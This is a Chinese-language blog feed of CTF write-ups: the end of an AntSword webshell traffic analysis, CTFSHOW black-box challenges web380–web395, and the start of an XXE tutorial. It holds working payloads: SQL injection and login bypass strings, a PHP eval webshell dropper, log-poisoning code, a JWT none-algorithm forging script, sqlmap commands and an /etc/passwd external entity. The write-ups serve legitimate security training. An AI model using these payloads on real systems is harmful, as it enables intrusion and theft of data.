class="line">flag&#123;flag.txt&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>黑客上传的文件内容是什么</strong></p><p>分析第四个请求包，可以发现编码内容跟其他流量包有较大差距，由于蚁剑上传的文件会对内容进行16进制编码，因此我们对其进行解码查看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730192302335.png"></p><p>解码选择“Hex Digits”，其他不用变，成功得到文件内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730192421756.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;write_flag&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>黑客下载了哪个文件，提交文件绝对路径</strong></p><p>分析第六个响应包，可以看到这是一个文件的返回内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730195107359.png"></p><p>通过分析，这六个HTTP事务（一次完整的请求+响应）里面，前三个是执行系统命令的，后三个则是执行文件上传下载浏览操作的</p><p>其中第四个我们已经证实是文件上传，那第五个是什么呢？通过对请求包进行解码，得到内容是&#x2F;var&#x2F;www&#x2F;html&#x2F;7，这是蚁剑自动执行的，实际上攻击者应该是点开了蚁剑的<strong>文件管理</strong>功能，然后回显为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730195547252.png"></p><p>显示的是<code>/var/www/html</code>里面的内容，因此第五个事务并不是下载文件，而是浏览目录</p><p>最后看第六个请求包的内容，步骤跟之前一样，得到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730200530897.png"></p><p>结合前面的返回内容，因此第六个请求包反应的就是黑客下载的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/var/www/html/config.php&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.前三个事务反应的是执行系统命令，后三个事务反应的是文件上传下载浏览等操作，通过对前三个请求包解码可以看到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730204205964.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250730204309938.png"></p><p><code>/bin/sh</code> 是指向系统标准shell的路径，用于进行交互，也就是执行系统命令，而后三个事务没有</p><p>2.攻击者的完整行为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.攻击者首先通过蚁剑连接webshell，文件名为1.php，连接密码为1，连接URL为http://192.168.200.54/1.php</span><br><span class="line">2.连接后双击打开了/var/www/html目录，点开虚拟终端，执行命令id和pwd</span><br><span class="line">3.接着执行ls和pwd，查看当前目录文件和所在目录</span><br><span class="line">4.执行cat /etc/passwd和pwd，查看/etc/passwd内容和当前目录</span><br><span class="line">5.上传文件flag.txt到/var/www/html，内容为flag&#123;write_flag&#125;</span><br><span class="line">6.攻击者点开文件管理功能查看/var/www/html目录</span><br><span class="line">7.在文件管理功能处攻击者下载了/var/www/html/config.php，获得网站配置文件</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250730210321419.png"></p><p>通过查看config.php文件，攻击者获得了目标网站数据库的敏感信息等</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>网安日记本：<a href="https://blog.csdn.net/haosha__demingzi/article/details/135816411">https://blog.csdn.net/haosha__demingzi/article/details/135816411</a></p>]]></content>
    
    
    <summary type="html">蚁剑流量分析详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 黑盒测试 web380 - web395</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/</id>
    <published>2025-07-27T12:21:23.000Z</published>
    <updated>2025-07-27T12:22:25.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是黑盒测试"><a href="#什么是黑盒测试" class="headerlink" title="什么是黑盒测试"></a>什么是黑盒测试</h2><p>黑盒测试（Black-Box Testing）是一种软件测试方法，测试人员在<strong>完全不了解程序内部结构和源代码</strong>的情况下，对程序的功能进行测试。测试人员就像普通用户一样，只能通过程序的输入（如点击链接、在输入框中填写数据）来观察其输出，以此判断程序是否存在问题</p><h2 id="黑盒测试一般思路"><a href="#黑盒测试一般思路" class="headerlink" title="黑盒测试一般思路"></a>黑盒测试一般思路</h2><p>在进行黑盒测试时，通常会遵循一个系统性的流程，大致可以分为以下几个关键步骤：</p><p><strong>1. 信息收集 (Reconnaissance)</strong></p><p>这是所有测试的第一步，目的是尽可能多地了解目标，发现所有可能的攻击入口</p><ul><li><strong>目录&#x2F;文件扫描</strong>：使用工具扫描网站可能存在的隐藏目录和文件，如后台登录页面、功能性文件、源码备份等。</li><li><strong>前端代码分析</strong>：查看网页的HTML、CSS和JavaScript源码（浏览器F12或Ctrl+U），从中寻找隐藏的路径、注释、API接口等。</li><li><strong>技术栈识别</strong>：通过HTTP响应头、错误信息、网页页脚等判断网站使用的技术（如Apache、Nginx等），有助于我们选择更具针对性的测试方法。</li></ul><p><strong>2. 漏洞发现 (Vulnerability Analysis)</strong></p><p>收集到足够的信息后，就可以对发现的各个功能点和入口点进行漏洞测试</p><ul><li><strong>输入点测试</strong>：对所有用户可以输入数据的地方（如URL参数、搜索框、登录框）进行测试，寻找SQL注入、文件包含、命令执行等漏洞。</li><li><strong>认证与授权测试</strong>：测试登录认证机制是否可以被绕过或破解，例如使用万能密码、暴力破解、伪造JWT等。</li><li><strong>逻辑测试</strong>：测试应用程序的业务逻辑是否存在缺陷，例如密码重置功能是否可以被滥用、支付流程是否可以被绕过等。</li></ul><p><strong>3. 漏洞利用 (Exploitation)</strong></p><p>在确认漏洞存在后，构造特定的Payload来利用这个漏洞，以达到我们的最终目的。在CTF中，这个目的通常是读取服务器上的<code>flag</code>文件。在真实的渗透测试中，目的可能是获取服务器的控制权或窃取敏感数据等</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h3><p>扫描网站目录，发现存在两个文件路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142224269.png"></p><p>其中第一个大小为0B，可以不用管，直接看第二个路径<code>/page.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142333053.png"></p><p>显示打开$id.php失败，我们尝试能不能控制这个参数，输入<code>/page.php?id=1</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142607470.png"></p><p>发现存在文件包含漏洞，直接输入<code>/page.php?id=flag</code>，查看源码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725142727324.png"></p><h3 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h3><p>打开网站，查看网页源代码，发现相比上一题，这里多了个可疑路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153243865.png"></p><p>为了更直观地看到区别，这里把上一题的网页源码放出来</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153615340.png"></p><p>我们访问路径<code>/alsckdfy</code>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153359744.png"></p><h3 id="web382"><a href="#web382" class="headerlink" title="web382"></a>web382</h3><p>打开网站，查看网页源代码，跟上一题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725153243865.png"></p><p>继续访问路径<code>/alsckdfy</code>，这次打开了一个登录框</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725154508006.png"></p><p>尝试用万能密码，成功登录，账号<code>1&#39; or 1=1 #</code>，密码随便写，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725154640903.png"></p><h3 id="web383"><a href="#web383" class="headerlink" title="web383"></a>web383</h3><p>跟上题步骤一样，也是先访问路径<code>/alsckdfy</code>，打开登录框后输入万能密码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725155034524.png"></p><h3 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h3><p>跟之前一样，来到登录框这里，这次题目有提示，告诉我们密码前2位是小写字母，后三位是数字，很明显是要爆破</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725155312098.png"></p><p>因此我们抓取登录的包来尝试爆破，账号用admin，密码可以根据题目要求生成一个字典，python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;passwd.txt&quot;</span></span><br><span class="line"></span><br><span class="line">letters = string.ascii_lowercase  <span class="comment"># 小写字母 &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">digits = string.digits          <span class="comment"># 数字 &#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> letter_pair <span class="keyword">in</span> itertools.product(letters, repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> digit_triplet <span class="keyword">in</span> itertools.product(digits, repeat=<span class="number">3</span>):</span><br><span class="line">            password = <span class="string">&quot;&quot;</span>.join(letter_pair) + <span class="string">&quot;&quot;</span>.join(digit_triplet)</span><br><span class="line">            f.write(password + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密码字典生成完毕，已保存到 <span class="subst">&#123;filename&#125;</span> 文件中。&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后插入到密码处爆破即可，我这里用的yakit，如果是burpsuite同理</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725162849055.png"></p><p>最后爆破出来密码是<code>xy123</code>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725163117700.png"></p><h3 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h3><p>跟之前一样，来到登录框这里，但是这次万能密码不行，题目也没有提示，先尝试扫目录看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725163904498.png"></p><p>发现有个路径<code>/install</code>，拼接进网站访问看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725164018869.png"></p><p>然后访问<code>/install/?install</code>，发现成功将管理员密码重置为默认密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725164202807.png"></p><p>因为不知道默认密码，因此我们尝试进行弱口令爆破</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725165047725.png"></p><p>爆破得到密码为<strong>admin888</strong>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725164546007.png"></p><h3 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h3><p>扫描目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171214575.png"></p><p>访问<code>/install</code>，但是这次显示lock.dat存在</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171253540.png"></p><p>这题相比上一题多了一个<code>/clear.php</code>，访问显示清理完成，我们尝试能不能控制它清理我们指定的文件，猜测参数可能为file，访问<code>/clear.php?file=install/lock.dat</code>，接着再次访问<code>/install</code>，发现lock.dat成功被删除</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171808129.png"></p><p>这时再访问<code>/install/?install</code>重置密码即可，其他步骤跟上题一样，密码依然是<strong>admin888</strong>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725171905118.png"></p><h3 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h3><p>扫描目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725172615509.png"></p><p>发现多了个<code>/debug</code>，访问看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725172708216.png"></p><p>显示<strong>file not exist</strong>，猜测可以进行文件包含，输入<code>/debug/?file=/etc/passwd</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250725172828155.png"></p><p>成功读取到文件，尝试进行日志包含执行命令，<strong>UA</strong>写入如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250725174131199.png"></p><p>再次访问<code>/install</code>，发现成功删除lock.dat</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725174241686.png"></p><p>其他步骤跟之前一样，密码依然是<strong>admin888</strong>，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250725174444249.png"></p><h3 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h3><p>访问路径<code>/debug</code>，输入<code>/debug/?file=/etc/passwd</code>，但是这次回显方式不一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726101223209.png"></p><p>由于暂时没有可用的方法，因此我们对后台登录页面进行目录扫描</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726101555042.png"></p><p>由前几道题可知，flag就存放在<code>/alsckdfy/check.php</code>里面，但是我们现在暂时没有权限去访问</p><p>扫描结果中我们发现路径<code>/alsckdfy/editor/</code>，访问后看到是一个编辑器</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726102012991.png"></p><p>存在文件上传页面，我们可以尝试上传一句话木马进去</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726102243669.png"></p><p>但是这里对文件上传后缀有限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726102213177.png"></p><p>我们把木马写好后改后缀为zip，上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250726102958966.png"></p><p>复制路径，然后拼接到<code>/debug/?file=/var/www/html</code>后面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726103109951.png"></p><p>访问路径<code>/1.php</code>，发现成功写入webshell</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726103226033.png"></p><p>执行命令<code>tac alsckdfy/check.php</code>得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726103416177.png"></p><h3 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h3><p>访问路径<code>/debug</code>，这次显示权限不足</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726105300526.png"></p><p>F12查看cookie，发现多了一个auth验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726105358160.png"></p><p>网页解密jwt，发现是加密验证，用<strong>c-jwt-cracker</strong>爆破得到密钥为123456，然后把<strong>sub</strong>那里的user改为admin</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726130224180.png"></p><p>将token复制到<strong>auth</strong>那里，刷新网页，成功绕过权限限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726130325950.png"></p><p>剩下的步骤跟上题一样，最后得到flag为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250726130413950.png"></p><h3 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h3><p><strong>方法一（JWT伪造）：</strong></p><p>访问路径<code>/debug</code>，依旧是显示权限不足，但是这次密钥爆破不出来了，因此换个方法，把alg改为none，sub改为admin，然后重新编码token，如果后端没有对算法进行验证，那么就可以成功绕过了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727150212179.png"></p><p>用python脚本实现，记得要先用自己jwt解码的payload复制替换dict，然后更改user为admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把自己的payload复制替换dict，然后更改user为admin</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1753530361</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1753537561</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1753530361</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;2b4b35d9ec779539cc1d8c4c8b4659aa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(<span class="built_in">dict</span>, key=<span class="string">&#x27;&#x27;</span>,headers=headers, algorithm=<span class="string">&quot;none&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到token后复制替换网页中的cookie，成功绕过限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727151019170.png"></p><p>剩下的步骤跟web388一样，成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727152558175.png"></p><p><strong>方法二（数字型注入）：</strong></p><p>在首页打开<strong>灯泡往事</strong>，发现有个id存在注入漏洞</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727151418862.png"></p><p>输入单引号和双引号都没反应，经过测试，发现是数字型注入，输入<code>page.php?id=-1 union select 1,2,3#</code>，回显位置为2和3</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727151731833.png"></p><p>接下来就是把<code>alsckdfy/check.php</code>的内容写到页面即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.php?id=-1 union select 1,2,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255)#</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727152226300.png"></p><p>然后查看网页源代码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727152303115.png"></p><h3 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h3><p><strong>方法一（JWT伪造）：</strong></p><p>上一题的解法依旧能用，跟之前一样，也是先绕过权限写入日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727153731737.png"></p><p>然后利用webshell读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727153757690.png"></p><p><strong>方法二（字符型注入）：</strong></p><p>在首页打开<strong>灯泡往事</strong>，发现多了一个<strong>标题输入框</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250727154533090.png"></p><p>经测试存在字符型注入，为单引号，且#被过滤，用<code>-- -</code>代替，回显位置为2和3</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727154642253.png"></p><p>把<code>alsckdfy/check.php</code>的内容写到页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=-1&#x27; union select 1,2,substr((select load_file(&#x27;/var/www/html/alsckdfy/check.php&#x27;)),1,255)-- -</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727154921268.png"></p><p>查看网页源码即可得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727154944575.png"></p><h3 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h3><p><strong>方法一（JWT伪造）：</strong></p><p>跟web390方法一样，不过这次flag位置改变了，不在<code>alsckdfy/check.php</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727155924268.png"></p><p>而是在根目录<code>/flag</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727155839329.png"></p><p><strong>方法二（字符型注入）：</strong></p><p>跟上题方法一样，不过要读取的文件改成了根目录<code>/flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=-1&#x27; union select 1,2,substr((select load_file(&#x27;/flag&#x27;)),1,255)-- -</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727160403388.png"></p><h3 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h3><p><strong>方法一（JWT伪造）：</strong></p><p>跟上题方法一样，flag也是在根目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727161002389.png"></p><p><strong>方法二（堆叠注入）：</strong></p><p>在首页最底下发现有个搜索引擎</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727163048703.png"></p><p>点第一个百度，进去之后发现是百度的搜索页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727163228862.png"></p><p>修改网页id值，又显示其他页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727163319794.png"></p><p>因此可以判断这里存储的是网页链接，通过传入的id值查询数据库中的url并进行访问</p><p>同时测试发现<code>/search.php?title=1</code>存在堆叠注入，需要先获取数据库的表名和列名再利用，用sqlmap</p><p>获取数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET --dbs --batch</span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow --tables --batch</span><br></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow -T link --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250727171403864.png"></p><p>接着利用堆叠注入插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link(id, name, url) values(11,&#x27;a&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure><p>最后访问<code>/link.php?id=11</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727172346550.png"></p><h3 id="web394"><a href="#web394" class="headerlink" title="web394"></a>web394</h3><p><strong>方法一（JWT伪造）：</strong></p><p>跟web390方法一样，但是flag这次不在根目录<code>/flag</code>了，而是在网站目录的<code>alsckdfy/check.php</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727183842499.png"></p><p><strong>方法二（堆叠注入）：</strong></p><p>跟上题方法一样，但是这次过滤了一些字符，用16进制绕过即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727184234096.png"></p><p>记得在前面加个0x表示16进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search.php?title=1&#x27;;insert into link(id, name, url)</span><br><span class="line">values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);</span><br></pre></td></tr></table></figure><p>最后访问<code>/link.php?id=10</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727184632353.png"></p><p>查看网页源代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727184653503.png"></p><h3 id="web395"><a href="#web395" class="headerlink" title="web395"></a>web395</h3><p><strong>方法一（JWT伪造）：</strong></p><p>解法跟上题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727190828512.png"></p><p><strong>方法二（堆叠注入）：</strong></p><p>解法也是跟上题一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250727190950137.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>NaecoYes：<a href="https://blog.csdn.net/q20010619/article/details/120639310">https://blog.csdn.net/q20010619/article/details/120639310</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW 黑盒测试专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | XXE题解 web373 - web378</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-xxe-web373-web378/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-xxe-web373-web378/</id>
    <published>2025-07-24T10:42:23.000Z</published>
    <updated>2025-07-24T11:12:23.547Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML，全称为可扩展标记语言（eXtensible Markup Language），设计宗旨是传输和存储数据</p><p>可以把它和HTML对比来理解：</p><ul><li><strong>HTML</strong> 的标签（如<code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>）是预定义好的，主要功能是告诉浏览器如何<strong>显示</strong>内容。</li><li><strong>XML</strong> 的标签则可以由开发者根据需求<strong>自己定义</strong>，用来清晰地描述数据的结构和含义。</li></ul><p>举个例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>小明<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>小红<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>提醒<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>别忘了周五的会议！<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了更好地理解XXE，我们还需要了解XML中两个与漏洞密切相关的关键组件：<code>DOCTYPE</code> 和 <code>ENTITY</code></p><ul><li><strong>DOCTYPE (文档类型声明)</strong> ：它通常出现在XML文档的顶部，用于定义该文档的结构和规则。对于XXE漏洞来说，<code>DOCTYPE</code>最重要的作用是，它提供了一个可以定义实体（ENTITY）的地方</li><li><strong>ENTITY (实体)</strong> ：必须在<code>DOCTYPE</code>声明中定义，主要有两种：<ul><li><strong>内部实体</strong>：像一个简单的文本变量，方便在文档中复用。例如：<code>&lt;!ENTITY author &quot;Wayne&quot;&gt;</code>，之后在文档中使用的 <code>&amp;author;</code> 就会被替换为 “Wayne”</li><li><strong>外部实体</strong>：这是XXE漏洞的核心。它允许我们引用<strong>外部资源</strong>的内容，例如服务器上的一个文件或一个网址。例如：<code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></li></ul></li></ul><h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" 